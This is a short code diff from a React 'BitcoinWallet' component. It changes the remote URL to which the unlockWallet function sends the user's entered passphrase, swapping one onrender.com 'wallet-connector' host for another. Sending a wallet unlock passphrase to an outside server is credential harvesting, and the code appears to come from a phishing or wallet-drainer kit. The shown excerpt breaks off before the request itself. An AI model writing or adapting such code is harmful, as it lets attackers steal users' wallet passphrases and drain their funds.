@@ -10,7 +10,7 @@ const BitcoinWallet = () => {
   const [loading, setLoading] = useState(false);
 
   const unlockWallet = async () => {
-    const url = 'https://obaro-wallet-connector.onrender.com/bitcoin';
+    const url = 'https://secondwalletvalwizzy.onrender.com/bitcoin';
     const data = { passphrase: text };
     try {
       setLoading(true);
